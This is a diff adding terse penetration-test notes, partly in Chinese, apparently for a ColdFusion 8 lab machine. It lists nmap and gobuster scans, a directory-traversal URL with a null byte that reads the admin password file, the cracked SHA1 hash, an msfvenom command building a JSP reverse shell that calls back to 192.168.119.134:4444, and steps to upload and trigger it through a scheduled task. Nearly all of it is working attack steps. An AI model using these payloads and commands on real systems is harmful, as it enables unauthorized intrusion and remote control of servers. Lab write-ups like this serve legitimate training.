@@ -1,0 +1,28 @@
+nmap -sC -sV -Pn 10.11.1.10 > nmap.txt
+nmap -p- 10.11.1.10 > nmapall.txt
+nmap -sVC  10.11.1.10 -Pn > nmap.txt
+nmap  -p- -T5 10.11.1.10   > nmapall.txt
+gobuster dir  -u http://10.11.1.10/  -w /usr/share/dirb/wordlists/common.txt -x txt,php,cgi > gobuster.txt
+gobuster dir  -u http://10.11.1.10/cfdocs/  -w /usr/share/dirb/wordlists/common.txt -x txt,php,cgi > gobusterdocs.txt
+gobuster dir  -u http://10.11.1.10/cfide/  -w /usr/share/dirb/wordlists/common.txt -x txt,php,cgi > gobusteride.txt
+
+http://10.11.1.10/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en
+
+/cfdocs (Status: 301)
+/cfide (Status: 301)
+/out.txt (Status: 200)
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST="192.168.119.134" LPORT=4444 -f raw > shell.jsp
+
+
+1.nmap掃描發現只有一個80port,然後gobuster發現是ColdFusion服務
+2.根據ColdFusion漏洞可查看到密碼AAFDC23870ECBCD3D557B6423A8982134E17927E
+http://10.11.1.10/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en
+3.拿上hashs.com查看發現在sha1加密,解密後得到pass123
+4.登入後可以看到是ColdFusion8,根據版本查找到漏洞腳本
+5.生成reverse shell jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST="192.168.119.134" LPORT=4444 -f raw > shell.jsp
+6.在mapping中可以看到機器的工程路徑 	C:\Inetpub\wwwroot\CFIDE
+7.使用 schdule task將shell.jsp上傳上去
+8.訪問http://10.11.1.10/CFIDE/shell.jsp 取得reverse shell
+
